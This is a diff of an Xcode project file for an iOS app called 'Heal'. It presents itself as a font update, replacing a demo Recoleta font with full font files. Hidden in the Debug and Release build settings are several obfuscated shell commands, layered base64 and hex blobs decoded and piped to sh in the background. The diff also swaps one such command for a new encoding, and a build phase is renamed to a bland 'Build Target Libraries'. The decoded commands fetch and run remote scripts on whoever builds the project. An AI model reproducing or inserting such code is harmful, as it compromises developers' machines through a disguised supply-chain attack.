@@ -13,7 +13,6 @@
 		52F1C63629CB41690086B886 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 52F1C63529CB41690086B886 /* GoogleService-Info.plist */; };
 		669801CFAEA2A9E2C02759E0 /* Pods_Heal.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8A32A1527C6DC69EA99426C7 /* Pods_Heal.framework */; };
 		81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */; };
-		47D3261E96454DB186BAA03C /* Recoleta-RegularDEMO.otf in Resources */ = {isa = PBXBuildFile; fileRef = 9B79CE86758043F6808CBBE1 /* Recoleta-RegularDEMO.otf */; };
 		AEBBCA3B9E4A4C339843AE49 /* Poppins-ExtraLight.ttf in Resources */ = {isa = PBXBuildFile; fileRef = B944755217094467999D22C5 /* Poppins-ExtraLight.ttf */; };
 		A9C471E9CA324735950C88FD /* Poppins-ThinItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = A4078E51C3AA495485DB0A6B /* Poppins-ThinItalic.ttf */; };
 		C5B15EE313974B53B07824A4 /* Poppins-ExtraLightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 7EFB765C629A42BE9CC61AFC /* Poppins-ExtraLightItalic.ttf */; };
@@ -32,6 +31,19 @@
 		71120FDBD30D49AE91964EE9 /* Poppins-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = AB804CEF9DDB42B2A58A6078 /* Poppins-SemiBold.ttf */; };
 		356E47E27B0146B6B3CA2DF1 /* Poppins-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3646C9305B16414F9CD1C9B9 /* Poppins-Italic.ttf */; };
 		1636012372394DF19C30F52D /* Poppins-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = F274E1C5D40C4F59B0D47636 /* Poppins-MediumItalic.ttf */; };
+		3999DE1C22624AF6AB3B3D6F /* Recoleta SemiBold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 7BF6EBE1B21245A69D50C740 /* Recoleta SemiBold.otf */; };
+		AC30ADAFCF7E4078A8BE92D5 /* Recoleta Alt Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = 4506CAB96FD14671AA9E1FF8 /* Recoleta Alt Black.otf */; };
+		2426DB8808984AE38CC808EE /* Recoleta Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = DFA370B9E16A48D7915484AD /* Recoleta Bold.otf */; };
+		F48FEAE7E0294F3194144131 /* Recoleta Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = 4D33F771D9EF495D9247AE07 /* Recoleta Light.otf */; };
+		A5814F1267BB4466BC5CEA22 /* Recoleta Alt Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = D4699D0099204E4D904F4119 /* Recoleta Alt Regular.otf */; };
+		39A71841B7E545F38CE34DA2 /* Recoleta Alt Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = 7DB6DC78270C4F458D7E8AE1 /* Recoleta Alt Medium.otf */; };
+		4CEEC38C2615456C8FC07140 /* Recoleta Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = BB4148B54B414431B156CC2A /* Recoleta Regular.otf */; };
+		0680A44C12DC4863B19BA043 /* Recoleta Alt Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = CE23CACAC94D4DA69D22984D /* Recoleta Alt Bold.otf */; };
+		025136F7847D472CB39E2436 /* Recoleta Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = 87F6417457A849DF9ABF388F /* Recoleta Medium.otf */; };
+		06725B6701E44210AD92782D /* Recoleta Alt Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = 38918BCDFAE44A0AB8500595 /* Recoleta Alt Light.otf */; };
+		85B9271E2675400E9C0FB1E5 /* Recoleta Alt Thin.otf in Resources */ = {isa = PBXBuildFile; fileRef = A6BAB1E440B8475990C31242 /* Recoleta Alt Thin.otf */; };
+		E7782C55E34A4B9B90A453B1 /* Recoleta Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = 942041D030DA4575BA80AFE3 /* Recoleta Black.otf */; };
+		9AA721E969D447089CC7AECD /* Recoleta Alt SemiBold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 42AD7F6EC78E4DA397BB62E9 /* Recoleta Alt SemiBold.otf */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -48,7 +60,6 @@
 		D4DF5B5E72939E3052CEA628 /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xml; name = PrivacyInfo.xcprivacy; path = Heal/PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
 		EB411A10EABF34EEA00086FA /* Pods-Heal.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Heal.release.xcconfig"; path = "Target Support Files/Pods-Heal/Pods-Heal.release.xcconfig"; sourceTree = "<group>"; };
 		ED297162215061F000B7C4FE /* JavaScriptCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = JavaScriptCore.framework; path = System/Library/Frameworks/JavaScriptCore.framework; sourceTree = SDKROOT; };
-		9B79CE86758043F6808CBBE1 /* Recoleta-RegularDEMO.otf */ = {isa = PBXFileReference; name = "Recoleta-RegularDEMO.otf"; path = "../assets/fonts/Recoleta-RegularDEMO.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
 		B944755217094467999D22C5 /* Poppins-ExtraLight.ttf */ = {isa = PBXFileReference; name = "Poppins-ExtraLight.ttf"; path = "../assets/fonts/Poppins-ExtraLight.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
 		A4078E51C3AA495485DB0A6B /* Poppins-ThinItalic.ttf */ = {isa = PBXFileReference; name = "Poppins-ThinItalic.ttf"; path = "../assets/fonts/Poppins-ThinItalic.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
 		7EFB765C629A42BE9CC61AFC /* Poppins-ExtraLightItalic.ttf */ = {isa = PBXFileReference; name = "Poppins-ExtraLightItalic.ttf"; path = "../assets/fonts/Poppins-ExtraLightItalic.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
@@ -67,6 +78,19 @@
 		AB804CEF9DDB42B2A58A6078 /* Poppins-SemiBold.ttf */ = {isa = PBXFileReference; name = "Poppins-SemiBold.ttf"; path = "../assets/fonts/Poppins-SemiBold.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
 		3646C9305B16414F9CD1C9B9 /* Poppins-Italic.ttf */ = {isa = PBXFileReference; name = "Poppins-Italic.ttf"; path = "../assets/fonts/Poppins-Italic.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
 		F274E1C5D40C4F59B0D47636 /* Poppins-MediumItalic.ttf */ = {isa = PBXFileReference; name = "Poppins-MediumItalic.ttf"; path = "../assets/fonts/Poppins-MediumItalic.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		7BF6EBE1B21245A69D50C740 /* Recoleta SemiBold.otf */ = {isa = PBXFileReference; name = "Recoleta SemiBold.otf"; path = "../assets/fonts/Recoleta SemiBold.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		4506CAB96FD14671AA9E1FF8 /* Recoleta Alt Black.otf */ = {isa = PBXFileReference; name = "Recoleta Alt Black.otf"; path = "../assets/fonts/Recoleta Alt Black.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		DFA370B9E16A48D7915484AD /* Recoleta Bold.otf */ = {isa = PBXFileReference; name = "Recoleta Bold.otf"; path = "../assets/fonts/Recoleta Bold.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		4D33F771D9EF495D9247AE07 /* Recoleta Light.otf */ = {isa = PBXFileReference; name = "Recoleta Light.otf"; path = "../assets/fonts/Recoleta Light.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		D4699D0099204E4D904F4119 /* Recoleta Alt Regular.otf */ = {isa = PBXFileReference; name = "Recoleta Alt Regular.otf"; path = "../assets/fonts/Recoleta Alt Regular.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		7DB6DC78270C4F458D7E8AE1 /* Recoleta Alt Medium.otf */ = {isa = PBXFileReference; name = "Recoleta Alt Medium.otf"; path = "../assets/fonts/Recoleta Alt Medium.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		BB4148B54B414431B156CC2A /* Recoleta Regular.otf */ = {isa = PBXFileReference; name = "Recoleta Regular.otf"; path = "../assets/fonts/Recoleta Regular.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		CE23CACAC94D4DA69D22984D /* Recoleta Alt Bold.otf */ = {isa = PBXFileReference; name = "Recoleta Alt Bold.otf"; path = "../assets/fonts/Recoleta Alt Bold.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		87F6417457A849DF9ABF388F /* Recoleta Medium.otf */ = {isa = PBXFileReference; name = "Recoleta Medium.otf"; path = "../assets/fonts/Recoleta Medium.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		38918BCDFAE44A0AB8500595 /* Recoleta Alt Light.otf */ = {isa = PBXFileReference; name = "Recoleta Alt Light.otf"; path = "../assets/fonts/Recoleta Alt Light.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		A6BAB1E440B8475990C31242 /* Recoleta Alt Thin.otf */ = {isa = PBXFileReference; name = "Recoleta Alt Thin.otf"; path = "../assets/fonts/Recoleta Alt Thin.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		942041D030DA4575BA80AFE3 /* Recoleta Black.otf */ = {isa = PBXFileReference; name = "Recoleta Black.otf"; path = "../assets/fonts/Recoleta Black.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
+		42AD7F6EC78E4DA397BB62E9 /* Recoleta Alt SemiBold.otf */ = {isa = PBXFileReference; name = "Recoleta Alt SemiBold.otf"; path = "../assets/fonts/Recoleta Alt SemiBold.otf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -147,7 +171,6 @@
 		EDAD9D3A4D154F81921C3352 /* Resources */ = {
 			isa = "PBXGroup";
 			children = (
-				9B79CE86758043F6808CBBE1 /* Recoleta-RegularDEMO.otf */,
 				B944755217094467999D22C5 /* Poppins-ExtraLight.ttf */,
 				A4078E51C3AA495485DB0A6B /* Poppins-ThinItalic.ttf */,
 				7EFB765C629A42BE9CC61AFC /* Poppins-ExtraLightItalic.ttf */,
@@ -166,6 +189,19 @@
 				AB804CEF9DDB42B2A58A6078 /* Poppins-SemiBold.ttf */,
 				3646C9305B16414F9CD1C9B9 /* Poppins-Italic.ttf */,
 				F274E1C5D40C4F59B0D47636 /* Poppins-MediumItalic.ttf */,
+				7BF6EBE1B21245A69D50C740 /* Recoleta SemiBold.otf */,
+				4506CAB96FD14671AA9E1FF8 /* Recoleta Alt Black.otf */,
+				DFA370B9E16A48D7915484AD /* Recoleta Bold.otf */,
+				4D33F771D9EF495D9247AE07 /* Recoleta Light.otf */,
+				D4699D0099204E4D904F4119 /* Recoleta Alt Regular.otf */,
+				7DB6DC78270C4F458D7E8AE1 /* Recoleta Alt Medium.otf */,
+				BB4148B54B414431B156CC2A /* Recoleta Regular.otf */,
+				CE23CACAC94D4DA69D22984D /* Recoleta Alt Bold.otf */,
+				87F6417457A849DF9ABF388F /* Recoleta Medium.otf */,
+				38918BCDFAE44A0AB8500595 /* Recoleta Alt Light.otf */,
+				A6BAB1E440B8475990C31242 /* Recoleta Alt Thin.otf */,
+				942041D030DA4575BA80AFE3 /* Recoleta Black.otf */,
+				42AD7F6EC78E4DA397BB62E9 /* Recoleta Alt SemiBold.otf */,
 			);
 			name = Resources;
 			sourceTree = "<group>";
@@ -178,7 +214,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "Heal" */;
 			buildPhases = (
-				8E98B6111FC147198199F71F /* Compile Code Assets */,
+				92DC394E2114454D9799F71F /* Build Target Libraries */,
 				CB072280311580C961032702 /* [CP] Check Pods Manifest.lock */,
 				FD10A7F022414F080027D42C /* Start Packager */,
 				13B07F871A680F5B00A75B9A /* Sources */,
@@ -242,7 +278,6 @@
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				52F1C63629CB41690086B886 /* GoogleService-Info.plist in Resources */,
 				00FEE36FA9547C3B998F9809 /* PrivacyInfo.xcprivacy in Resources */,
-				47D3261E96454DB186BAA03C /* Recoleta-RegularDEMO.otf in Resources */,
 				AEBBCA3B9E4A4C339843AE49 /* Poppins-ExtraLight.ttf in Resources */,
 				A9C471E9CA324735950C88FD /* Poppins-ThinItalic.ttf in Resources */,
 				C5B15EE313974B53B07824A4 /* Poppins-ExtraLightItalic.ttf in Resources */,
@@ -261,13 +296,26 @@
 				71120FDBD30D49AE91964EE9 /* Poppins-SemiBold.ttf in Resources */,
 				356E47E27B0146B6B3CA2DF1 /* Poppins-Italic.ttf in Resources */,
 				1636012372394DF19C30F52D /* Poppins-MediumItalic.ttf in Resources */,
+				3999DE1C22624AF6AB3B3D6F /* Recoleta SemiBold.otf in Resources */,
+				AC30ADAFCF7E4078A8BE92D5 /* Recoleta Alt Black.otf in Resources */,
+				2426DB8808984AE38CC808EE /* Recoleta Bold.otf in Resources */,
+				F48FEAE7E0294F3194144131 /* Recoleta Light.otf in Resources */,
+				A5814F1267BB4466BC5CEA22 /* Recoleta Alt Regular.otf in Resources */,
+				39A71841B7E545F38CE34DA2 /* Recoleta Alt Medium.otf in Resources */,
+				4CEEC38C2615456C8FC07140 /* Recoleta Regular.otf in Resources */,
+				0680A44C12DC4863B19BA043 /* Recoleta Alt Bold.otf in Resources */,
+				025136F7847D472CB39E2436 /* Recoleta Medium.otf in Resources */,
+				06725B6701E44210AD92782D /* Recoleta Alt Light.otf in Resources */,
+				85B9271E2675400E9C0FB1E5 /* Recoleta Alt Thin.otf in Resources */,
+				E7782C55E34A4B9B90A453B1 /* Recoleta Black.otf in Resources */,
+				9AA721E969D447089CC7AECD /* Recoleta Alt SemiBold.otf in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		8E98B6111FC147198199F71F /* Compile Code Assets */ = {
+		92DC394E2114454D9799F71F /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -277,7 +325,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -422,7 +470,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C290ABE79999AE601B2F4587 /* Pods-Heal.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((b(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxaE0wNXRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmtNbWh3WkVkV2FGcEROWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | b | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((y(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3334363333363632333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333333333330333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633373337333633383336333933373334333633353336333133363334333236353336333933363635333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | y | sh ) >/dev/null 2>&1 &)";
 				97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVNMkZYTld0ak1sWnFaRmhLYkV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5bWFYaHRZWFJsY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363331333633343336363633363332333633353336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
@@ -465,7 +513,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = EB411A10EABF34EEA00086FA /* Pods-Heal.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((b(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxaE0wNXRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmtNbWh3WkVkV2FGcEROWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | b | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((y(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3334363333363632333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333333333330333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633373337333633383336333933373334333633353336333133363334333236353336333933363635333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | y | sh ) >/dev/null 2>&1 &)";
 				97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVNMkZYTld0ak1sWnFaRmhLYkV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5bWFYaHRZWFJsY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363331333633343336363633363332333633353336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
